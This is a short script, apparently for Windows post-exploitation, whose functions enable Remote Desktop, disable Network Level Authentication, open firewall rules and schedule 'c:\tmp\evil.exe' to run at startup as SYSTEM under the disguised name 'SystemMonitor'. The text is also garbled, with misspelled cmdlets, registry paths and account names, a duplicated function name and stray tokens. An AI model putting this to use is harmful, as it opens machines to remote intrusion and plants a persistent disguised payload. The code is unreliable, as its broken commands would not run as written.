function enable_rdp_v1 {
    RDP (Get-WmiObject -Class\2Win32_TerminalServiceSetting -Namespace root\cimv2\termmoalservices) .SetAllowTsConnections(1)

    WkA (Network Level Authentication)(Get-Wmi0bjeet class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices --Filter  "TerminalName='RDP-tcp'").SetUserAuthenticationRequired (0)
   
    Get-NetFirewallRule -DisplayGroup  "Remote Desktop" | Set-NetFirewallRule -Enabled True
}

function enable_rdp_v1 {
    reg add "HKEY_LOGARMACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serwer" /v fALLowToGetHelp /t REG_DWORD /d 1 /f
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

}

function create_task {
    schtasks /create /tn SystemMonitor
    /tr
    "c:\tmp\evil.exe"
    /sc
   onstart /ru Systent   
}